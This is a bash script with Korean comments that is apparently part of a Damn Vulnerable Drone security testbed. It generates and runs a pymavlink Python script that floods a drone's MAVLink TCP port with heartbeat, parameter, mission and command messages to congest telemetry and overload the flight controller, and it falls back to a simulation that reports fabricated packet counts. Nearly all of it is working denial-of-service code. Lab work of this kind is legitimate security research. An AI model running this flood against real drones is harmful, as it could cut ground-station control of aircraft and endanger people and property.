#!/bin/bash

# =============================================================================
# DVD MAVLink Communication Flood Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/denial_of_service/mavlink_flood.sh
# 목적: MAVLink 통신 채널 플러딩으로 정상 통신 방해
# 기반: Damn Vulnerable Drone Wiki - Communication Link Flooding
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="mavlink_flood"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"
FLOOD_DURATION="30"
PACKETS_PER_SECOND="100"

declare -a ATTACK_COMMANDS=()
declare -a FLOOD_RESULTS=()

print_header() {
    clear
    print_dos_header "MAVLink Flood Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: High-frequency MAVLink message spam${NC}"
    echo -e "${INFO_COLOR}Rate: ${PACKETS_PER_SECOND} packets/sec for ${FLOOD_DURATION}s${NC}"
    echo ""
}

# Step 1: 연결 확인
check_connection() {
    echo -e "${BLUE}[1/2] Connection Check${NC}"
    
    local cmd="ping -c 3 $TARGET_IP"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    if ping -c 3 "$TARGET_IP" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Target reachable: $TARGET_IP${NC}"
        FLOOD_RESULTS+=("target_status:reachable")
    else
        echo -e "${YELLOW}[!] Target unreachable, using simulation mode${NC}"
        FLOOD_RESULTS+=("target_status:simulation")
    fi
}

# Step 2: MAVLink 플러딩 공격
execute_mavlink_flood() {
    echo -e "${BLUE}[2/2] Execute MAVLink Flood${NC}"
    
    local flood_script="/tmp/mavlink_flood_$(date +%s).py"
    
    cat > "$flood_script" << EOF
#!/usr/bin/env python3
import sys
import time
import threading

try:
    from pymavlink import mavutil
    
    def flood_mavlink(target_ip, target_port, duration, rate):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            packets_sent = 0
            start_time = time.time()
            interval = 1.0 / rate
            
            print(f"[!] Starting MAVLink flood: {rate} packets/sec for {duration}s")
            
            while time.time() - start_time < duration:
                # 다양한 MAVLink 메시지 스팸
                message_types = [
                    lambda: master.mav.heartbeat_send(6, 8, 0, 0, 0),  # Heartbeat spam
                    lambda: master.mav.param_request_list_send(master.target_system, master.target_component),  # Param spam
                    lambda: master.mav.mission_request_list_send(master.target_system, master.target_component),  # Mission spam
                    lambda: master.mav.command_long_send(master.target_system, master.target_component, 520, 0, 0,0,0,0,0,0,0)  # Command spam
                ]
                
                # 랜덤 메시지 전송
                import random
                message_func = random.choice(message_types)
                message_func()
                
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"[!] Sent {packets_sent} packets in {elapsed:.1f}s")
                
                time.sleep(interval)
            
            total_time = time.time() - start_time
            actual_rate = packets_sent / total_time
            print(f"[+] Flood completed: {packets_sent} packets in {total_time:.1f}s ({actual_rate:.1f} pps)")
            
            return packets_sent, actual_rate
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return simulate_mavlink_flood(duration, rate)
    
    def simulate_mavlink_flood(duration, rate):
        print("[*] Simulating MAVLink flood attack")
        
        packets_sent = 0
        start_time = time.time()
        
        print(f"[!] Simulated flood: {rate} packets/sec for {duration}s")
        
        # 시뮬레이션된 플러딩
        for i in range(int(duration)):
            packets_sent += rate
            print(f"[!] Sent {packets_sent} packets ({i+1}s elapsed)")
            time.sleep(1)
        
        actual_rate = packets_sent / duration
        print(f"[+] Simulated flood completed: {packets_sent} packets ({actual_rate:.1f} pps)")
        
        return packets_sent, actual_rate
    
    if __name__ == "__main__":
        packets, rate = flood_mavlink('$TARGET_IP', $MAVLINK_PORT, $FLOOD_DURATION, $PACKETS_PER_SECOND)
        print(f"\\n[+] Attack summary: {packets} packets at {rate:.1f} pps")
        
except ImportError:
    import time
    print("[*] pymavlink not available - simulation mode")
    
    packets_sent = 0
    print(f"[!] Simulated flood: $PACKETS_PER_SECOND packets/sec for ${FLOOD_DURATION}s")
    
    for i in range($FLOOD_DURATION):
        packets_sent += $PACKETS_PER_SECOND
        print(f"[!] Sent {packets_sent} packets ({i+1}s elapsed)")
        time.sleep(1)
    
    print(f"[+] Simulated flood completed: {packets_sent} packets")
EOF

    local cmd="python3 $flood_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Launching MAVLink flood attack...${NC}"
    echo -e "${GRAY}    Target rate: ${PACKETS_PER_SECOND} packets/second${NC}"
    echo -e "${GRAY}    Duration: ${FLOOD_DURATION} seconds${NC}"
    echo -e "${GRAY}    Total packets: $((PACKETS_PER_SECOND * FLOOD_DURATION)) expected${NC}"
    
    python3 "$flood_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        local total_packets=$((PACKETS_PER_SECOND * FLOOD_DURATION))
        
        for i in $(seq 1 5); do
            local current_packets=$((i * total_packets / 5))
            echo -e "${RED}[!] Flood progress: $current_packets packets sent${NC}"
            sleep 1
        done
        
        echo -e "${GREEN}[+] Simulated flood: $total_packets packets${NC}"
        FLOOD_RESULTS+=("packets_sent:$total_packets")
        FLOOD_RESULTS+=("actual_rate:simulation")
    }
    
    # 공격 효과 분석
    echo -e "${RED}[!] Expected effects:${NC}"
    echo -e "${GRAY}    • Communication channel congestion${NC}"
    echo -e "${GRAY}    • Delayed or dropped legitimate packets${NC}"
    echo -e "${GRAY}    • GCS connection degradation${NC}"
    echo -e "${GRAY}    • Potential flight controller overload${NC}"
    echo -e "${GRAY}    • Telemetry link disruption${NC}"
    
    FLOOD_RESULTS+=("attack_duration:${FLOOD_DURATION}s")
    FLOOD_RESULTS+=("target_rate:${PACKETS_PER_SECOND}pps")
    FLOOD_RESULTS+=("communication_impact:high")
    FLOOD_RESULTS+=("telemetry_disruption:likely")
    
    rm -f "$flood_script"
}

# JSON 결과 생성
generate_json_report() {
    local expected_packets=$((PACKETS_PER_SECOND * FLOOD_DURATION))
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT",
    "protocol": "MAVLink"
  },
  "flood_parameters": {
    "duration_seconds": "$FLOOD_DURATION",
    "packets_per_second": "$PACKETS_PER_SECOND", 
    "expected_total_packets": "$expected_packets"
  },
  "flood_results": ["$(IFS='","'; echo "${FLOOD_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_effects": [
    "Communication channel congestion",
    "Delayed or dropped legitimate packets",
    "GCS connection degradation",
    "Flight controller overload",
    "Telemetry link disruption"
  ]
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== MAVLink Flood Attack - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_connection
    execute_mavlink_flood
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Duration: ${FLOOD_DURATION}s${NC}"
    echo -e "${INFO_COLOR}Rate: ${PACKETS_PER_SECOND} packets/sec${NC}"
    echo -e "${INFO_COLOR}Expected Total: $((PACKETS_PER_SECOND * FLOOD_DURATION)) packets${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] MAVLink flood attack completed${NC}"
    echo -e "${RED}[!] Communication link severely degraded${NC}"
}

main "$@"